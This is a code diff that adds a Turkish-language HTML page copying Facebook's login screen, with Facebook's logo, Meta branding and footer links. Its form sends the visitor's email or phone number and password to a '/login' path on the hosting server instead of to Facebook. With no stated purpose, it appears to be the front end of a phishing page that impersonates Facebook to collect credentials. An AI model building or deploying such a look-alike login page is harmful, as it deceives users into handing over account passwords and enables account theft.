@@ -1,1 +1,284 @@
-
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Giriş Yap veya Kaydol</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: space-between;
+            max-width: 980px;
+            width: 100%;
+            padding: 20px;
+        }
+        
+        .logo-section {
+            max-width: 500px;
+            margin-right: 40px;
+        }
+        
+        .logo {
+            max-width: 300px;
+            margin-bottom: 10px;
+        }
+        
+        .logo-text {
+            font-size: 28px;
+            line-height: 32px;
+            width: 500px;
+        }
+        
+        .login-section {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 396px;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 6px;
+            border: 1px solid #dddfe2;
+            font-size: 17px;
+            margin-bottom: 12px;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .login-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 14px;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+        
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+        
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-password a {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-account-button {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 14px;
+            width: 60%;
+            cursor: pointer;
+            margin: 0 auto;
+            display: block;
+        }
+        
+        .create-account-button:hover {
+            background-color: #36a420;
+        }
+        
+        .create-page {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 14px;
+        }
+        
+        .create-page a {
+            color: black;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        
+        footer {
+            background-color: white;
+            padding: 20px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        
+        .footer-content {
+            max-width: 980px;
+            margin: 0 auto;
+        }
+        
+        .languages {
+            display: flex;
+            flex-wrap: wrap;
+            margin-bottom: 10px;
+        }
+        
+        .languages a {
+            color: #737373;
+            font-size: 12px;
+            margin-right: 10px;
+            text-decoration: none;
+        }
+        
+        .divider-footer {
+            border-bottom: 1px solid #dddfe2;
+            margin: 10px 0;
+        }
+        
+        .links {
+            display: flex;
+            flex-wrap: wrap;
+        }
+        
+        .links a {
+            color: #737373;
+            font-size: 12px;
+            margin-right: 20px;
+            margin-bottom: 5px;
+            text-decoration: none;
+        }
+        
+        .copyright {
+            color: #737373;
+            font-size: 12px;
+            margin-top: 20px;
+        }
+        
+        @media screen and (max-width: 900px) {
+            .container {
+                flex-direction: column;
+            }
+            
+            .logo-section {
+                margin-right: 0;
+                margin-bottom: 40px;
+                text-align: center;
+            }
+            
+            .logo-text {
+                width: 100%;
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-section">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="logo">
+            <p class="logo-text">Facebook tanıdıklarınla iletişim kurmanı ve hayatında olup bitenleri paylaşmanı sağlar.</p>
+        </div>
+        
+        <div class="login-section">
+            <form action="/login" method="POST">
+                <input type="text" name="email" class="input-field" placeholder="E-posta veya Telefon Numarası" required>
+                <input type="password" name="password" class="input-field" placeholder="Şifre" required>
+                <button type="submit" class="login-button">Giriş Yap</button>
+            </form>
+            
+            <div class="forgot-password">
+                <a href="#">Şifreni mi unuttun?</a>
+            </div>
+            
+            <div class="divider"></div>
+            
+            <button class="create-account-button">Yeni Hesap Oluştur</button>
+            
+            <div class="create-page">
+                <a href="#">Ünlü biri, marka veya işletme için </a> sayfa oluştur.
+            </div>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="footer-content">
+            <div class="languages">
+                <a href="#" style="color: #737373; font-weight: bold;">Türkçe</a>
+                <a href="#">English (US)</a>
+                <a href="#">Kurdî (Kurmancî)</a>
+                <a href="#">العربية</a>
+                <a href="#">Deutsch</a>
+                <a href="#">Русский</a>
+                <a href="#">Français (France)</a>
+                <a href="#">فارسی</a>
+                <a href="#">Español</a>
+                <a href="#">Português (Brasil)</a>
+                <a href="#">हिन्दी</a>
+            </div>
+            
+            <div class="divider-footer"></div>
+            
+            <div class="links">
+                <a href="#">Kaydol</a>
+                <a href="#">Giriş Yap</a>
+                <a href="#">Messenger</a>
+                <a href="#">Facebook Lite</a>
+                <a href="#">Watch</a>
+                <a href="#">Yerler</a>
+                <a href="#">Oyunlar</a>
+                <a href="#">Marketplace</a>
+                <a href="#">Meta Pay</a>
+                <a href="#">Oculus</a>
+                <a href="#">Portal</a>
+                <a href="#">Instagram</a>
+                <a href="#">Bulletin</a>
+                <a href="#">Yerel</a>
+                <a href="#">Bağış Kampanyaları</a>
+                <a href="#">Hizmetler</a>
+                <a href="#">Oy Kullanma Bilgi Merkezi</a>
+                <a href="#">Gruplar</a>
+                <a href="#">Hakkımızda</a>
+                <a href="#">Reklam Oluştur</a>
+                <a href="#">Sayfa Oluştur</a>
+                <a href="#">Geliştiriciler</a>
+                <a href="#">Kariyer Olanakları</a>
+                <a href="#">Gizlilik</a>
+                <a href="#">Çerezler</a>
+                <a href="#">Ad Choices</a>
+                <a href="#">Koşullar</a>
+                <a href="#">Yardım</a>
+                <a href="#">Kişi Yükleme ve Hesabı Olmayan Kişiler</a>
+            </div>
+            <p class="copyright">Meta © 2023</p>
+        </div>
+    </footer>
+</body>
+</html>
